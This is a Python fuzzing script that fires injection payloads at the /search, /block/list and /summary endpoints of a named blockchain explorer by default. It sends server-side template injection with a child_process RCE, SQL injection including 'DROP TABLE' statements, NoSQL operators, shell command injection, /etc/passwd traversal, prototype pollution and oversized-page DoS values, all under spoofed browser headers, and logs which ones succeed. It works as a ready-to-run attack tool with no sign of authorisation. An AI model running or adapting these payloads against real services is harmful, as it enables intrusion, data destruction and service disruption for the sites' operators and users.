#!/usr/bin/env python3
"""
Explorer Fuzzer for Blockchain Explorer APIs — SSTI, SQLi, NoSQL, Cmd Injection, Path Traversal, Prototype Pollution
Adapted from MultiVAC e.mtv.ac fuzz 2026-08-17.

Usage: python3 explorer_fuzz.py <EXPLORER_URL>
Default: https://e.mtv.ac

Tests /search, /block/list, /summary endpoints with:
  - SSTI (Jinja2, Tornado, Vue, EJS, Pug, Nunjucks RCE)
  - SQLi (OR 1=1, UNION, comment, time-based, sleep, stacked)
  - NoSQL ($gt, $where, $regex, $ne)
  - Command injection (|id, ;id, `id`, $(id), &&id)
  - Path traversal (../etc/passwd, URL-encoded, double-dot, file://)
  - Prototype pollution (__proto__, constructor.prototype)
"""
import json
import requests
import sys
import time

URL = sys.argv[1] if len(sys.argv) > 1 else "https://e.mtv.ac"
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
HEADERS = {"Content-Type": "application/json", "User-Agent": UA, "Origin": URL, "Referer": f"{URL}/"}
TIMEOUT = 15
results = []

def log(test, endpoint, payload, status, body, exploit):
    results.append({"test": test, "endpoint": endpoint, "payload": str(payload)[:200],
                    "status": status, "body_snippet": body[:500] if body else "", "exploitability": exploit})
    print(f"\n{'='*60}\nTEST: {test}\nENDPOINT: {endpoint}\nPAYLOAD: {str(payload)[:200]}\nSTATUS: {status}\nBODY: {(body or '')[:300]}\nEXPLOIT: {exploit}\n{'='*60}")

def post(path, data):
    try:
        r = requests.post(f"{URL}{path}", json=data, headers=HEADERS, timeout=TIMEOUT)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)

search_payloads = [
    # SSTI
    ("SSTI Jinja2 {{7*7}}", {"keyword": "{{7*7}}"}, "HIGH - Jinja2 would evaluate to 49"),
    ("SSTI Tornado ${7*7}", {"keyword": "${7*7}"}, "HIGH - Tornado/Nunjucks eval"),
    ("SSTI constructor RCE", {"keyword": "{{constructor.constructor('return process')()}}"}, "CRITICAL - JS RCE"),
    ("SSTI Nunjucks RCE", {"keyword": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"}, "CRITICAL"),
    ("SSTI EJS", {"keyword": "<%= 7*7 %>"}, "MEDIUM"),
    # SQLi
    ("SQLi OR 1=1", {"keyword": "' OR 1=1 --"}, "CRITICAL"),
    ("SQLi UNION", {"keyword": "' UNION SELECT 1,2,3,4,5 --"}, "CRITICAL"),
    ("SQLi SLEEP", {"keyword": "' AND SLEEP(5) --"}, "HIGH"),
    ("SQLi DROP", {"keyword": "'; DROP TABLE users; --"}, "CRITICAL"),
    # NoSQL
    ("NoSQL $gt", {"keyword": {"$gt": ""}}, "CRITICAL"),
    ("NoSQL $where", {"keyword": {"$where": "1==1"}}, "CRITICAL"),
    ("NoSQL $ne", {"keyword": {"$ne": "null"}}, "HIGH"),
    # Cmd injection
    ("Cmd |id", {"keyword": "|id"}, "CRITICAL"),
    ("Cmd ;id", {"keyword": ";id"}, "CRITICAL"),
    ("Cmd $(id)", {"keyword": "$(id)"}, "CRITICAL"),
    # Path traversal
    ("Path ../../etc/passwd", {"keyword": "../../etc/passwd"}, "CRITICAL"),
    ("Path encoded", {"keyword": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"}, "CRITICAL"),
    ("file://", {"keyword": "file:///etc/passwd"}, "HIGH"),
    # Prototype pollution
    ("Proto __proto__", {"keyword": "test", "__proto__": {"isAdmin": True}}, "CRITICAL"),
    ("Proto constructor", {"keyword": "test", "constructor": {"prototype": {"isAdmin": True}}}, "CRITICAL"),
]

print("### /search ###")
for name, payload, exploit in search_payloads:
    s, b = post("/search", payload)
    # Check for "49" in body (SSTI evaluation indicator)
    if "49" in (b or "") and "7*7" in str(payload):
        exploit = "CRITICAL CONFIRMED - SSTI evaluated {{7*7}} to 49"
    log(name, "/search", payload, s, b, exploit)
    time.sleep(0.3)

block_payloads = [
    ("page 0", {"page": 0, "size": 10}, "INFO"),
    ("page -1", {"page": -1, "size": 10}, "HIGH"),
    ("page 999999", {"page": 999999, "size": 10}, "LOW"),
    ("size 999999", {"page": 1, "size": 999999}, "HIGH - DoS"),
    ("size -1", {"page": 1, "size": -1}, "MEDIUM"),
    ("SQLi page", {"page": "1' OR 1=1 --", "size": 10}, "CRITICAL"),
    ("SQLi size", {"page": 1, "size": "10; DROP TABLE blocks"}, "CRITICAL"),
    ("SSTI page", {"page": "{{7*7}}", "size": 10}, "HIGH"),
    ("NoSQL page", {"page": {"$gt": 0}, "size": 10}, "CRITICAL"),
    ("Proto pollution", {"page": 1, "size": 10, "__proto__": {"isAdmin": True}}, "CRITICAL"),
    ("Max int32 size", {"page": 1, "size": 2147483647}, "HIGH - DoS"),
]

print("\n### /block/list ###")
for name, payload, exploit in block_payloads:
    s, b = post("/block/list", payload)
    # Check if response differs from baseline error page
    if b and "error" not in b.lower() and "<!DOCTYPE" not in b:
        exploit = f"CONFIRMED - non-error response: {b[:200]}"
    log(name, "/block/list", payload, s, b, exploit)
    time.sleep(0.3)

# /summary — check if input is ignored
print("\n### /summary ###")
summary_payloads = [
    ("SSTI", {"keyword": "{{7*7}}"}, "HIGH"),
    ("SQLi", {"keyword": "' OR 1=1 --"}, "CRITICAL"),
    ("path traversal", {"keyword": "../../etc/passwd"}, "CRITICAL"),
    ("empty", {}, "INFO"),
    ("proto pollution", {"extra": "test", "__proto__": {"x": 1}}, "HIGH"),
]
baseline = None
for name, payload, exploit in summary_payloads:
    s, b = post("/summary", payload)
    if baseline is None:
        baseline = b
    elif b == baseline:
        exploit = "NONE - endpoint ignores input (returns identical response)"
    log(f"Summary {name}", "/summary", payload, s, b, exploit)
    time.sleep(0.3)

with open("explorer_fuzz_results.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\nTotal tests: {len(results)}\nResults: explorer_fuzz_results.json")
